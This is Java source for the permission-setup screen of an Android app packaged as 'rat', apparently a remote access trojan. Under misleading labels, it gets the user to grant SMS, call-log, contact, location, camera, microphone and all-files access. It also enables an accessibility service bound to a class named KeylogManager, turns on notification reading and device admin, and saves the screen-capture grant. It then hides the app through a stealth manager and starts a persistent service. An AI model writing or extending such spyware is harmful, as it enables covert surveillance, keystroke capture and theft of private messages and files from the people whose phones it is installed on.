package com.wexow.rat;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.wexow.rat.core.MainService;
import com.wexow.rat.permissions.PermissionHelper;
import com.wexow.rat.permissions.PermissionItem;
import com.wexow.rat.stealth.OemHelper;
import com.wexow.rat.stealth.StealthManager;
import com.wexow.rat.utils.Prefs;

import java.util.ArrayList;
import java.util.List;

public class PermissionWizardActivity extends AppCompatActivity {

    private static final String TAG = "PermWizard";

    // ⭐ Request codes for permission batches
    private static final int REQ_BATCH_1 = 2001;
    private static final int REQ_BATCH_2 = 2002;
    private static final int REQ_BATCH_3 = 2003;
    private static final int REQ_BATCH_4 = 2004;
    private static final int REQ_BATCH_5 = 2005;
    private static final int REQ_BATCH_6 = 2006;
    private static final int REQ_BATCH_7 = 2007;
    private static final int MP_REQ = 3001;

    // ⭐ Permission batches (max 5 per batch for MIUI)
    private static final String[][] PERM_BATCHES = {
        // Batch 1: Media & Storage
        {
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.RECORD_AUDIO,
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
        },
        // Batch 2: Media (Android 13+) + All Files
        {
            "android.permission.READ_MEDIA_IMAGES",
            "android.permission.READ_MEDIA_VIDEO",
            "android.permission.READ_MEDIA_AUDIO",
            "android.permission.MANAGE_EXTERNAL_STORAGE",
        },
        // Batch 3: SMS & Phone
        {
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.SEND_SMS,
            android.Manifest.permission.RECEIVE_SMS,
            android.Manifest.permission.READ_PHONE_STATE,
            android.Manifest.permission.READ_PHONE_NUMBERS,
        },
        // Batch 4: Call Logs
        {
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.WRITE_CALL_LOG,
            android.Manifest.permission.CALL_PHONE,
            android.Manifest.permission.ANSWER_PHONE_CALLS,
        },
        // Batch 5: Contacts & Accounts
        {
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.WRITE_CONTACTS,
            android.Manifest.permission.GET_ACCOUNTS,
        },
        // Batch 6: Location
        {
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.ACCESS_BACKGROUND_LOCATION,
        },
        // Batch 7: Notifications & Bluetooth & Sensors
        {
            "android.permission.POST_NOTIFICATIONS",
            "android.permission.BLUETOOTH_CONNECT",
            "android.permission.BLUETOOTH_SCAN",
            "android.permission.BODY_SENSORS",
            "android.permission.ACTIVITY_RECOGNITION",
        },
    };

    private int currentBatch = 0;

    private LinearLayout container;
    private ProgressBar progressBar;
    private TextView progressText, hintText;
    private Button btnStart;

    private final List<PermissionItem> items = new ArrayList<>();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_permission);

        container    = findViewById(R.id.container);
        progressBar  = findViewById(R.id.progressBar);
        progressText = findViewById(R.id.progressText);
        hintText     = findViewById(R.id.hintText);
        btnStart     = findViewById(R.id.btnStart);

        buildItems();
        renderItems();

        // ⭐ Start requesting permissions in batches
        requestRuntimeBatched();

        btnStart.setOnClickListener(v -> completeSetup());
    }

    // ═══════════════════════════════════════════════════════════
    // ⭐ Permission Items
    // ═══════════════════════════════════════════════════════════

    private void buildItems() {
        items.add(new PermissionItem(
            "accessibility",
            "♿ Accessibility Service",
            "Required for screen monitoring and interaction",
            true,
            () -> openAccessibilityServiceDirect(),
            () -> PermissionHelper.isAccessibilityEnabled(this)
        ));

        items.add(new PermissionItem(
            "notification",
            "🔔 Notification Listener",
            "Required to read notifications",
            true,
            () -> PermissionHelper.openNotificationListener(this),
            () -> PermissionHelper.isNotificationListenerEnabled(this)
        ));

        items.add(new PermissionItem(
            "overlay",
            "🖼️ Display Over Other Apps",
            "Required to display alerts",
            true,
            () -> PermissionHelper.openOverlay(this),
            () -> PermissionHelper.canDrawOverlays(this)
        ));

        items.add(new PermissionItem(
            "battery",
            "🔋 Ignore Battery Optimization",
            "Required to keep the service running",
            true,
            () -> PermissionHelper.openBatteryOptimization(this),
            () -> PermissionHelper.isIgnoringBatteryOptimizations(this)
        ));

        items.add(new PermissionItem(
            "all_files",
            "📁 All Files Access",
            "Required to read WhatsApp media",
            true,
            () -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    try {
                        Intent i = new Intent(
                            android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION
                        );
                        i.setData(android.net.Uri.parse("package:" + getPackageName()));
                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(i);
                    } catch (Exception e) {
                        startActivity(new Intent(
                            android.provider.Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION
                        ));
                    }
                }
            },
            () -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    return android.os.Environment.isExternalStorageManager();
                }
                return true;
            }
        ));

        items.add(new PermissionItem(
            "install",
            "📦 Install Unknown Apps",
            "Required to install updates",
            true,
            () -> PermissionHelper.openInstallUnknownApps(this),
            () -> PermissionHelper.canInstallPackages(this)
        ));

        items.add(new PermissionItem(
            "autostart",
            "🚀 Autostart (" + OemHelper.getBrandName() + ")",
            "Required to keep the app running after reboot",
            false,
            () -> OemHelper.openAutoStartSettings(this),
            () -> true
        ));

        items.add(new PermissionItem(
            "device_admin",
            "🛡️ Device Admin",
            "Required for advanced security features",
            false,
            () -> PermissionHelper.openDeviceAdmin(this),
            () -> PermissionHelper.isDeviceAdmin(this)
        ));
    }

    // ═══════════════════════════════════════════════════════════
    // ⭐ Batched Permission Request
    // ═══════════════════════════════════════════════════════════

    private void requestRuntimeBatched() {
        currentBatch = 0;
        requestNextBatch();
    }

    private void requestNextBatch() {
        while (currentBatch < PERM_BATCHES.length) {
            String[] batch = PERM_BATCHES[currentBatch];
            List<String> need = new ArrayList<>();

            for (String p : batch) {
                // ⭐ Skip version-specific permissions
                if (p.equals("android.permission.READ_MEDIA_IMAGES") && Build.VERSION.SDK_INT < 33) continue;
                if (p.equals("android.permission.READ_MEDIA_VIDEO") && Build.VERSION.SDK_INT < 33) continue;
                if (p.equals("android.permission.READ_MEDIA_AUDIO") && Build.VERSION.SDK_INT < 33) continue;
                if (p.equals("android.permission.POST_NOTIFICATIONS") && Build.VERSION.SDK_INT < 33) continue;
                if (p.equals("android.permission.BLUETOOTH_CONNECT") && Build.VERSION.SDK_INT < 31) continue;
                if (p.equals("android.permission.BLUETOOTH_SCAN") && Build.VERSION.SDK_INT < 31) continue;
                if (p.equals("android.permission.BODY_SENSORS") && Build.VERSION.SDK_INT < 20) continue;
                if (p.equals("android.permission.ACTIVITY_RECOGNITION") && Build.VERSION.SDK_INT < 29) continue;

                if (p.equals("android.permission.MANAGE_EXTERNAL_STORAGE")) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                        if (!android.os.Environment.isExternalStorageManager()) {
                        }
                    }
                    continue;
                }

                if (ContextCompat.checkSelfPermission(this, p)
                    != PackageManager.PERMISSION_GRANTED) {
                    need.add(p);
                }
            }

            if (!need.isEmpty()) {
                Log.e(TAG, "📋 Requesting batch " + currentBatch +
                    " with " + need.size() + " permissions: " + need);

                int requestCode = REQ_BATCH_1 + currentBatch;
                ActivityCompat.requestPermissions(this,
                    need.toArray(new String[0]), requestCode);
                return;
            }

            currentBatch++;
        }

        Log.e(TAG, "✅ All permission batches requested");
    }

    // ═══════════════════════════════════════════════════════════
    // ⭐ UI Rendering
    // ═══════════════════════════════════════════════════════════

    private void renderItems() {
        container.removeAllViews();

        for (PermissionItem item : items) {
            item.granted = item.isGranted();

            LinearLayout card = new LinearLayout(this);
            card.setOrientation(LinearLayout.VERTICAL);
            card.setPadding(30, 30, 30, 30);
            card.setBackgroundColor(0xFFFFFFFF);

            LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
            lp.setMargins(0, 0, 0, 16);
            card.setLayoutParams(lp);

            TextView title = new TextView(this);
            String status = item.granted ? "✅" : (item.required ? "❌" : "⚪");
            title.setText(status + "  " + item.title);
            title.setTextSize(16);
            title.setTextColor(0xFF212121);
            card.addView(title);

            TextView desc = new TextView(this);
            desc.setText(item.description);
            desc.setTextSize(13);
            desc.setTextColor(0xFF757575);
            desc.setPadding(0, 12, 0, 12);
            card.addView(desc);

            Button b = new Button(this);
            if (item.granted) {
                b.setText("✅ Granted");
                b.setEnabled(false);
            } else {
                b.setText("Grant Permission");
                b.setOnClickListener(v -> item.opener.run());
            }
            card.addView(b);

            container.addView(card);
        }

        addOemSection();
        updateProgress();
    }

    private void addOemSection() {
        TextView t = new TextView(this);
        t.setText("\n🔧 " + OemHelper.getBrandName() + " Settings");
        t.setTextSize(15);
        t.setPadding(0, 24, 0, 8);
        container.addView(t);

        TextView hint = new TextView(this);
        hint.setText(OemHelper.getSpecificHint());
        hint.setTextSize(12);
        hint.setPadding(24, 24, 24, 24);
        hint.setBackgroundColor(0xFFFFF3E0);
        container.addView(hint);
    }

    private void updateProgress() {
        int total = 0, granted = 0, missing = 0;
        for (PermissionItem i : items) {
            total++;
            i.granted = i.isGranted();
            if (i.granted) granted++;
            else if (i.required) missing++;
        }
        int pct = (int) ((granted * 100.0) / total);
        progressBar.setProgress(pct);
        progressText.setText(granted + " / " + total);

        if (missing == 0) {
            btnStart.setEnabled(true);
            hintText.setText("✅ All required permissions granted");
            hintText.setTextColor(0xFF4CAF50);
        } else {
            btnStart.setEnabled(false);
            hintText.setText(missing + " required permissions missing");
            hintText.setTextColor(0xFFF44336);
        }
    }

    // ═══════════════════════════════════════════════════════════
    // ⭐ Accessibility Service Opening
    // ═══════════════════════════════════════════════════════════

    private void openAccessibilityServiceDirect() {
        try {
            android.content.ComponentName cn = new android.content.ComponentName(
                this, KeylogManager.class);

            Intent intent = new Intent("android.settings.ACCESSIBILITY_DETAILS_SETTINGS");
            intent.putExtra("extra_component_name", cn.flattenToString());
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);

        } catch (Exception e) {
            try {
                Intent intent = new Intent();
                intent.setClassName(
                    "com.android.settings",
                    "com.android.settings.Settings$AccessibilitySettingsActivity");
                startActivity(intent);

            } catch (Exception e2) {
                try {
                    Intent intent = new Intent();
                    intent.setClassName(
                        "com.android.settings",
                        "com.android.settings.accessibility.MiuiAccessibilitySettingsActivity");
                    startActivity(intent);

                } catch (Exception e3) {
                    Toast.makeText(this, "Could not open settings", Toast.LENGTH_SHORT).show();
                }
            }
        }
    }

    // ═══════════════════════════════════════════════════════════
    // ⭐ Complete Setup & MediaProjection
    // ═══════════════════════════════════════════════════════════

    private void completeSetup() {
        Log.e(TAG, "✅ Setup complete");

        try {
            android.media.projection.MediaProjectionManager mpm =
                (android.media.projection.MediaProjectionManager)
                    getSystemService(MEDIA_PROJECTION_SERVICE);

            if (mpm != null) {
                startActivityForResult(mpm.createScreenCaptureIntent(), MP_REQ);
                return;
            }
        } catch (Exception e) {
            Log.e(TAG, "MP error: " + e.getMessage());
        }

        finishSetup();
    }

    @Override
    protected void onActivityResult(int req, int result, Intent data) {
        super.onActivityResult(req, result, data);

        if (req == MP_REQ) {
            if (result == RESULT_OK && data != null) {
                Log.e(TAG, "✅ MediaProjection granted");

                getSharedPreferences("wexow_prefs", MODE_PRIVATE)
                    .edit()
                    .putBoolean("mp_valid", true)
                    .putInt("mp_result_code", result)
                    .putString("mp_result_data", data.toUri(0))
                    .apply();
            }

            finishSetup();
        }
    }

    private void finishSetup() {
        Prefs.setSetupDone(this, true);
        StealthManager.fullStealth(this);

        try {
            Intent i = new Intent(this, MainService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(i);
            } else {
                startService(i);
            }
        } catch (Exception ignored) {}

        startActivity(new Intent(this, SetupCompleteActivity.class));
        finish();
    }

    // ═══════════════════════════════════════════════════════════
    // ⭐ Lifecycle & Callbacks
    // ═══════════════════════════════════════════════════════════

    @Override
    protected void onResume() {
        super.onResume();
        renderItems();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
            @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        // ⭐ Handle batched permission requests
        if (requestCode >= REQ_BATCH_1 && requestCode <= REQ_BATCH_7) {
            Log.e(TAG, "✅ Batch " + (requestCode - REQ_BATCH_1) +
                " completed, moving to next batch");

            currentBatch++;

            // ⭐ Delay before next batch
            new android.os.Handler(android.os.Looper.getMainLooper())
                .postDelayed(this::requestNextBatch, 600);
        }

        renderItems();
    }

    @Override
    public void onBackPressed() {
        Toast.makeText(this, "Complete the permissions first", Toast.LENGTH_SHORT).show();
    }
}
